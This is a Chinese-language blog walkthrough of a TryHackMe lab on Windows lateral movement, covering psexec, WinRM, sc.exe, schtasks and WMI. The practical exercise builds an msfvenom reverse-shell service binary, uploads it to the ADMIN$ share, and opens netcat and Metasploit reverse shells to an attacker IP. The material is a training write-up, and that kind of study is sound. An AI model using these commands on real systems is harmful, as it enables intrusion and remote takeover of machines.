<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>THM-Lateral Movement and Pivoting | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>THM-Lateral Movement and Pivoting</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-02-16T03:26:40.901Z" id="date"> 2024-02-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-02-17T06:56:57.510Z" id="updated"> 2024-02-17</time></div></span><br><span>Word Count: <div class="control">15.3k</div></span><br><span>Read Time: <div class="control">58 min</div></span></div></div><hr><div id="post-content"><h1>0x01 简介</h1>
<p>在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具.</p>
<p>建议在此之前先浏览一下<a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">入侵 AD</a> 和<a target="_blank" rel="noopener" href="https://tryhackme.com/room/adenumeration">枚举 AD</a> 房间。</p>
<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2>
<ul>
<li>熟悉攻击者使用的横向移动技术。</li>
<li>了解如何使用替代认证材料进行横向移动。</li>
<li>了解使用受感染主机作为枢纽的不同方法。</li>
</ul>
<h2 id="索取您的凭证"><a href="#索取您的凭证" class="headerlink" title="索取您的凭证"></a>索取您的凭证</h2>
<p>为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.com/creds">http://distributor.za.tryhackme.com/creds</a> 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。</p>
<p>此凭证对将为您提供对 <a target="_blank" rel="noopener" href="http://THMJMP2.za.tryhackme.com">THMJMP2.za.tryhackme.com</a> 的 SSH 访问。 THMJMP2 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。</p>
<p>对于 SSH 访问，您可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh za\\&lt;AD Username&gt;<span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com<br>    //获取到的凭证如下<br>Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: henry.bird <span class="hljs-attribute">Password</span>: Changeme123<br>    即:ssh za\\henry.bird<span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com  <br></code></pre></td></tr></table></figure>
<h1>0x02 通过网络移动</h1>
<h2 id="什么是横向运动？"><a href="#什么是横向运动？" class="headerlink" title="什么是横向运动？"></a>什么是横向运动？</h2>
<p>简而言之，横向移动是攻击者用来在网络中移动的一组技术。一旦攻击者获得对网络第一台计算机的访问权，出于多种原因，移动就变得至关重要，其中包括： - 实现攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱和避免被发现。</p>
<p>虽然许多网络杀伤链将横向移动视为线性过程的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，使我们能够访问新机器，在其中我们可以提升权限并提取凭据（如果可能）。有了新的凭证，循环又开始了。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115235787.png" alt="image-20240216115235787"></p>
<p>通常，我们会重复这个循环几次，然后才能达到网络上的最终目标。如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机，那么我们可能需要横向移动到在网络上拥有更多权限的其他主机。</p>
<h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2>
<p>假设我们正在执行红队参与，我们的最终目标是到达内部代码存储库，我们通过网络钓鱼活动在目标网络上获得了第一次妥协。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器进行的。</p>
<p>营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。</p>
<p>为了到达敏感的主机和服务，我们需要转移到其他主机并从那里转向我们的最终目标。为此，我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一番侦察，我们发现了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它属于公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115300957.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115300957.png" alt="image-20240216115300957"></p>
<p>请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使营销工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从检查登录审核日志的蓝队分析师的角度来看，这种行为的可疑性较小。</p>
<h2 id="攻击者的视角"><a href="#攻击者的视角" class="headerlink" title="攻击者的视角"></a>攻击者的视角</h2>
<p>攻击者可以通过多种方式进行横向移动。最简单的方法是使用标准管理协议（例如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。只要在规划与哪个帐户连接的位置时保持一定的一致性，这种方法就可以在某种程度上模拟常规用户的行为。虽然 IT 部门的用户通过 RDP 连接到 Web 服务器可能很常见并且不会受到关注，但必须注意不要尝试可疑的连接（例如，为什么本地管理员用户从营销部门连接到 DEV-001-PC）个人电脑？）.</p>
<p>如今，攻击者还可以使用其他横向移动方法，同时使蓝队有效检测正在发生的情况变得更具挑战性。虽然没有任何技术应该被认为是万无一失的，但我们至少可以尝试尽可能保持沉默。在接下来的任务中，我们将了解一些最常见的横向运动技术。</p>
<h2 id="管理员和UAC"><a href="#管理员和UAC" class="headerlink" title="管理员和UAC"></a>管理员和UAC</h2>
<p>在执行整个房间中介绍的大部分横向移动技术时，我们将主要使用管理员凭据。虽然人们可能期望每个管理员帐户都具有相同的目的，但必须区分两种类型的管理员：</p>
<ul>
<li>本地帐户属于本地管理员组</li>
<li>域帐户属于本地管理员组</li>
</ul>
<p>我们感兴趣的差异是用户帐户控制 (UAC) 对本地管理员（默认管理员帐户除外）施加的限制。默认情况下，除非通过 RDP 使用交互式会话，否则本地管理员将无法远程连接到计算机并执行管理任务。 Windows 将拒绝通过 RPC、SMB 或 WinRM 请求的任何管理任务，因为此类管理员将使用经过过滤的介质完整性令牌登录，从而防止帐户执行特权操作。唯一获得完全权限的本地帐户是默认管理员帐户。</p>
<p>具有本地管理权限的域帐户不会受到相同的处理，并且将以完全管理权限登录。</p>
<p>如果需要，可以禁用此安全功能，有时您会发现管理员组中的本地帐户和域帐户之间没有区别。不过，重要的是要记住，如果某些横向移动技术失败，可能是由于使用了强制执行 UAC 的非默认本地管理员。您可以在此处阅读有关此安全功能的更多详细信息：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">here</a></p>
<h1>0x03 远程生成过程</h1>
<p>此任务将研究攻击者远程生成进程的可用方法，允许他们在拥有有效凭据的计算机上运行命令。所讨论的每种技术都使用略有不同的方法来实现相同的目的，其中一些可能更适合某些特定场景。</p>
<h2 id="Psexec-执行程序"><a href="#Psexec-执行程序" class="headerlink" title="Psexec-执行程序"></a>Psexec 执行程序</h2>
<ul>
<li><strong>Ports:</strong> 445/TCP (SMB)</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以在此处下载：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">here</a></p>
<p>psexec 的工作方式如下：</p>
<ol>
<li>连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。</li>
<li>连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 <code>C:\Windows\psexesvc.exe</code> 关联。</li>
<li>创建一些命名管道来处理 stdin/stdout/stderr。</li>
</ol>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115647139.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115647139.png" alt="image-20240216115647139"></p>
<p>要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， <code>psexec64.exe</code> 可在 THMJMP2 中的 <code>C:\tools</code> 下找到）：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">psexec64<span class="hljs-selector-class">.exe</span> \\MACHINE_IP -u Administrator -<span class="hljs-selector-tag">p</span> Mypass123 -<span class="hljs-selector-tag">i</span> cmd<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<h2 id="使用-WinRM-远程创建进程"><a href="#使用-WinRM-远程创建进程" class="headerlink" title="使用-WinRM-远程创建进程"></a>使用 WinRM 远程创建进程</h2>
<ul>
<li><strong>Ports:</strong> 5985/TCP (WinRM HTTP)</li>
<li>所需的组成员身份：远程管理用户</li>
</ul>
<p>Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。</p>
<p>要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -u:Administrator -p:Mypass123 -r:target cmd<br></code></pre></td></tr></table></figure>
<p>我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Administrator&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Mypass123&#x27;</span>;<br><span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>; <br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;<br></code></pre></td></tr></table></figure>
<p>获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-Computername</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span><br></code></pre></td></tr></table></figure>
<p>Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Computername</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-ScriptBlock</span> &#123;whoami&#125;<br></code></pre></td></tr></table></figure>
<h2 id="使用-sc-远程创建服务"><a href="#使用-sc-远程创建服务" class="headerlink" title="使用-sc-远程创建服务"></a>使用 sc 远程创建服务</h2>
<ul>
<li>Ports: 端口：
<ul>
<li>135/TCP、49152-65535/TCP（DCE/RPC）</li>
<li>445/TCP（基于 SMB 命名管道的 RPC）</li>
<li>139/TCP（基于 SMB 命名管道的 RPC）</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。</p>
<p>我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到Service Control Manager（SVCCTL）远程服务程序：</p>
<ol>
<li>将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。</li>
</ol>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120249867.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120249867.png" alt="image-20240216120249867"></p>
<ol start="2">
<li>如果后一个连接失败，sc 将尝试通过端口 445 (SMB) 或 139（基于 NetBIOS 的 SMB）上的 SMB 命名管道到达 SVCCTL。</li>
</ol>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120302427.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120302427.png" alt="image-20240216120302427"></p>
<p>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto<br>sc<span class="hljs-selector-class">.exe</span> \\TARGET start THMservice<br></code></pre></td></tr></table></figure>
<p>服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。</p>
<p>要停止并删除该服务，我们可以执行以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> \\TARGET stop THMservice<br>sc<span class="hljs-selector-class">.exe</span> \\TARGET delete THMservice<br></code></pre></td></tr></table></figure>
<h2 id="远程创建计划任务"><a href="#远程创建计划任务" class="headerlink" title="远程创建计划任务"></a>远程创建计划任务</h2>
<p>我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /<span class="hljs-selector-tag">tr</span> &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd <span class="hljs-number">01</span>/<span class="hljs-number">01</span>/<span class="hljs-number">1970</span> /st <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <br><br>schtasks /s TARGET /run /TN <span class="hljs-string">&quot;THMtask1&quot;</span> <br></code></pre></td></tr></table></figure>
<p>我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (/sd) 和开始时间 (/st) 无论如何都不重要。</p>
<p>由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。</p>
<p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F<br></code></pre></td></tr></table></figure>
<h2 id="实践练习"><a href="#实践练习" class="headerlink" title="实践练习"></a>实践练习</h2>
<p>对于本练习，我们假设我们已经捕获了一些具有管理访问权限的凭据：</p>
<p><strong>User:</strong> <a target="_blank" rel="noopener" href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t1_leonard.summers</p>
<p><strong>Password:</strong> EZpass4ever</p>
<p>我们将展示如何使用这些凭据通过 <code>sc.exe</code> 横向移动到 THMIIS。请随意尝试其他方法，因为它们都应该适用于 THMIIS。</p>
<p>虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用 <code>net user</code> ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持 <code>exe-service</code> 格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止其被杀死。</p>
<p>要创建反向shell，我们可以使用以下命令：</p>
<p>注意：由于您将与其他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myservice.exe”，以避免覆盖其他人的有效负载。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/shell/reverse_tcp -f exe-service LHOST=<span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span> LPORT=<span class="hljs-number">5555</span> -o bcxservice<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<p>然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SCSS">smbclient -c &#x27;put bcxservice<span class="hljs-selector-class">.exe</span>&#x27; -U t1_leonard<span class="hljs-selector-class">.summers</span> -W ZA &#x27;<span class="hljs-comment">//thmiis.za.tryhackme.com/admin$/&#x27; EZpass4ever</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121358957.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121358957.png" alt="image-20240216121358957"></p>
<p>上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自 <code>msfconsole</code> 的反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfconsole<br>msf6 &gt; use exploit/multi/handler<br>msf6 exploit(multi/handler) &gt; set LHOST <span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span><br>msf6 exploit(multi/handler) &gt; set LPORT <span class="hljs-number">5555</span><br>msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp<br>msf6 exploit(multi/handler) &gt; exploit <br><br>[*] Started reverse TCP handler on <span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span>:<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>
<p>或者，您可以在 Linux 控制台上运行以下单行代码来执行相同的操作：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">msfconsole -<span class="hljs-selector-tag">q</span> -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span>; set LPORT <span class="hljs-number">5555</span>;exploit&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121628886.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121628886.png" alt="image-20240216121628886"></p>
<p>由于 <code>sc.exe</code> 不允许我们在命令中指定凭据，因此我们需要使用 <code>runas</code> 使用 t1_leonard.summer 的访问令牌生成一个新 shell。尽管如此，我们只能通过 SSH 访问计算机，因此如果我们尝试类似 <code>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</code> 的内容，新的命令提示符将在用户会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers <span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.236 6666&quot;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216122007744.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216122007744.png" alt="image-20240216122007744"></p>
<p>注意：请记住，由于您将 <code>runas</code> 与 <code>/netonly</code> 选项一起使用，因此不会费心检查所提供的凭据是否有效（有关此的更多信息，请参阅枚举 AD 室），因此请务必正确输入密码。如果不这样做，您稍后会在房间中看到一些 ACCESS DENIED 错误。</p>
<p>我们可以像往常一样在 AttackBox 中使用 nc 接收反向 shell 连接：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">nc -lvnp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
<p>最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc.exe \\thmiis.za.tryhackme.com create THMservice-bcx binPath= <span class="hljs-string">&quot;%windir%\bcxservice.exe&quot;</span> start= auto<br>C:\&gt; sc.exe \\thmiis.za.tryhackme.com start THMservice-bcx<br></code></pre></td></tr></table></figure>
<p>请务必更改您的服务名称，以避免与其他学生发生冲突。</p>
<p>启动该服务后，您应该会在 AttackBox 中收到一个连接，您可以从该连接访问 t1_leonard.summers 桌面上的第一个标志。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123451462.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123451462.png" alt="image-20240216123451462"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123458246.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123458246.png" alt="image-20240216123458246"></p>
<h1>0x04 使用 WMI 横向移动</h1>
<p>我们还可以使用 Windows Management Instrumentation (WMI) 以不同的方式执行上一个任务中讨论的许多技术。 WMI 是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。</p>
<p>简单来说，WMI 允许管理员执行标准管理任务，攻击者可以滥用这些任务以各种方式执行横向移动，我们将对此进行讨论。</p>
<h2 id="从-Powershell-连接到-WMI"><a href="#从-Powershell-连接到-WMI" class="headerlink" title="从-Powershell-连接到-WMI"></a>从 Powershell 连接到 WMI</h2>
<p>在能够使用 Powershell 命令连接到 WMI 之前，我们需要使用我们的用户和密码创建一个 PSCredential 对象。该对象将存储在 $credential 变量中，并在该任务的整个技术中使用：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Administrator&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Mypass123&#x27;</span>;<br><span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>;<br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;<br></code></pre></td></tr></table></figure>
<p>然后，我们继续使用以下协议之一建立 WMI 会话：</p>
<ul>
<li>DCOM：RPC over IP 将用于连接到 WMI。该协议使用端口 135/TCP 和端口 49152-65535/TCP，正如使用 sc.exe 时所解释的那样。</li>
<li>Wsman：WinRM 将用于连接到 WMI。此协议使用端口 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)。</li>
</ul>
<p>要从 Powershell 建立 WMI 会话，我们可以使用以下命令并将会话存储在 $Session 变量中，我们将在整个房间中使用不同的技术：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$Opt</span> = <span class="hljs-built_in">New-CimSessionOption</span> <span class="hljs-literal">-Protocol</span> DCOM<br><span class="hljs-variable">$Session</span> = <span class="hljs-built_in">New-Cimsession</span> <span class="hljs-literal">-ComputerName</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-SessionOption</span> <span class="hljs-variable">$Opt</span> <span class="hljs-literal">-ErrorAction</span> Stop<br></code></pre></td></tr></table></figure>
<p><code>New-CimSessionOption</code> cmdlet 用于配置 WMI 会话的连接选项，包括连接协议。然后，选项和凭据将传递到 <code>New-CimSession</code> cmdlet 以建立针对远程主机的会话。</p>
<h2 id="使用-WMI-远程创建进程"><a href="#使用-WMI-远程创建进程" class="headerlink" title="使用-WMI-远程创建进程"></a>使用 WMI 远程创建进程</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>我们可以利用 Windows Management Instrumentation (WMI) 从 Powershell 远程生成一个进程，向 Win32_Process 类发送 WMI 请求，以在我们之前创建的会话下生成该进程：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$Command</span> = <span class="hljs-string">&quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;</span>;<br><br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Process <span class="hljs-literal">-MethodName</span> Create <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<br>CommandLine = <span class="hljs-variable">$Command</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>请注意，WMI 不允许您查看任何命令的输出，但确实会静默创建所需的进程。</p>
